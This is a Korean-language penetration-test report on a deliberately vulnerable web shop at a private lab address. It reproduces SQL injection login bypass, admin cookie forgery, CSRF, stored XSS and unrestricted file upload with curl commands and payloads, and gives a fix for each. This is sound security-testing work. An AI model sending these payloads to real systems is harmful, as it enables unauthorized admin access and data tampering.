# VULN SHOP 취약점 보고서

## 개요
- 타겟: http://172.20.10.2:3000
- 필수 헤더: `X-Forwarded-For: 10.0.0.102`
- 테스트 계정: tester / test (일반 사용자)

## 1. 로그인 SQL Injection으로 인증 우회 (Critical)
- 설명: 로그인 쿼리에서 입력값 검증/바인딩이 없어 `' OR '1'='1` 주입 시 비밀번호를 무시하고 admin 계정(`user_id=1`) 세션이 발급됨.
- 재현 절차
  1) 요청: `curl -i -c /tmp/vulnshop.sqli -H "X-Forwarded-For: 10.0.0.102" -d "username=admin' OR '1'='1&password=anything" http://172.20.10.2:3000/login`
  2) 응답 헤더 확인: `Set-Cookie: user=admin; user_id=1` 발급, 302 `/` 리다이렉트 → 인증 성공 처리
  3) 이후 세션으로 서비스 접근 가능.
- 영향: 패스워드 없이 관리자 계정 로그인 가능. 다른 취약점(쿠키 변조, 관리자 기능 오남용)과 결합 시 전체 권한 장악.
- 대응 방안: 파라미터 바인딩/ORM 사용, 입력 이스케이프, 에러 메시지 최소화. 관리자 계정에 대해 추가 2FA 적용.

## 2. 세션 쿠키 변조로 관리자 권한 획득 (Critical)
- 설명: 로그인 시 `user`, `isAdmin`, `user_id` 쿠키가 서명/검증 없이 클라이언트에서 신뢰됨. 값을 조작하면 서버에서 관리자 권한으로 인식해 관리자 메뉴가 노출됨.
- 재현 절차
  1) 임의로 관리자 쿠키 지정: `curl -i -H "X-Forwarded-For: 10.0.0.102" -b "user=admin; isAdmin=true; user_id=1" http://172.20.10.2:3000/profile`
  2) 관리자 페이지 접근 확인: `curl -i -H "X-Forwarded-For: 10.0.0.102" -b "user=admin; isAdmin=true; user_id=1" http://172.20.10.2:3000/admin/users`
  3) 응답에 관리자 메뉴(상품 관리/사용자 관리)와 사용자 삭제 폼이 노출됨.
- 영향: 인증·인가 우회로 인해 임의 상품 가격/설명 변경, 일반 사용자 삭제 등 관리자 기능 전부 탈취 가능.
- 대응 방안: 서버 측 세션 저장 또는 서명된 세션 토큰 사용, 권한 검증을 서버 상태 기반으로 수행. 쿠키에 HttpOnly/Secure/유효기간 설정 및 클라이언트 조작 값을 신뢰하지 않도록 수정.

## 3. 관리자 기능 CSRF 보호 부재 (High)
- 설명: 관리자 페이지의 상태 변경 요청에 CSRF 토큰/Origin/Referer 검증이 없어 관리자가 악성 사이트 방문 시 쿠키 기반으로 임의 변경이 가능함.
- 재현 절차
  1) 관리자 쿠키를 가진 상태에서 악성 Origin 지정: `curl -i -H "X-Forwarded-For: 10.0.0.102" -H "Origin: http://evil.com" -b "user=admin; isAdmin=true; user_id=1" -d "name=OVERSIZED HOODIE&price=777&description=Heavyweight cotton fleece." http://172.20.10.2:3000/admin/products/1`
  2) 응답: 302 `/admin/products`, 페이지 재조회 시 가격이 777로 변경됨(후속 요청으로 120 복구)
- 영향: 관리자가 로그인된 상태에서 피싱/링크 클릭만으로 상품 가격 변조, 사용자 삭제 등 주요 관리 기능이 실행될 수 있음.
- 대응 방안: 모든 상태 변경 요청에 CSRF 토큰 적용, SameSite=Lax/Strict 쿠키 설정, Origin/Referer 검증, 관리자 액션에 재인증/2FA 적용.

## 4. Q&A 게시판 Stored XSS (High)
- 설명: 게시글 내용이 HTML 이스케이프 없이 그대로 렌더링되어 스크립트 삽입이 가능함. 로그인 없이 작성 가능.
- 재현 절차
  1) 게시글 등록: `curl -i -H "X-Forwarded-For: 10.0.0.102" --data-urlencode "content=<script>alert('xss')</script>" http://172.20.10.2:3000/board`
  2) 게시판 조회: `curl -s -H "X-Forwarded-For: 10.0.0.102" http://172.20.10.2:3000/board` → `<script>alert('xss')</script>`가 그대로 포함되어 실행됨.
- 영향: 방문자(관리자 포함) 브라우저 내에서 세션 쿠키 탈취, 피싱, 관리자 권한 탈취 등 가능.
- 대응 방안: 출력 시 HTML 이스케이프 처리, 입력 검증 및 허용 태그 화이트리스트 적용. CSP(Content-Security-Policy) 활성화.

## 5. 프로필 이미지 업로드 검증 부재로 임의 파일 업로드 (High)
- 설명: 프로필 업로드가 확장자/MIME 검증 없이 `/uploads/` 하위에 저장되고 웹에서 그대로 서빙됨. HTML/JS 업로드 시 스크립트가 실행되거나 외부 스크립트 호스팅에 활용 가능.
- 재현 절차
  1) HTML 페이로드 준비: `script/payload.html` (`<script>alert('uploaded-xss')</script>`)
  2) 업로드: `curl -i -b /tmp/vulnshop.cookies -H "X-Forwarded-For: 10.0.0.102" -F "profile_image=@script/payload.html;type=text/html" http://172.20.10.2:3000/profile/upload`
  3) 접근: `curl -i -H "X-Forwarded-For: 10.0.0.102" http://172.20.10.2:3000/uploads/payload.html` → `Content-Type: text/html`로 응답하며 자바스크립트 실행.
- 추가 확인: `payload.js` 업로드 시 `/uploads/payload.js`가 `Content-Type: text/javascript`로 노출되어 임의 JS 호스팅 가능. 파일명에 `../../` 포함해도 `/uploads/traversal.html`로 정규화되어 웹루트에 저장됨.
- 영향: 악성 HTML/JS 영구 저장 및 배포 가능. 다른 취약점과 결합 시 CSRF/XSS 확산, 악성 파일 호스팅 등으로 이어질 수 있음.
- 대응 방안: 업로드 허용 타입을 이미지로 제한하고 서버 측 MIME/확장자/매직바이트 검증, 파일명 난수화 및 웹 루트 외 저장. 업로드 파일은 다운로드 전용으로 서빙하고 실행 불가한 Content-Type 적용.
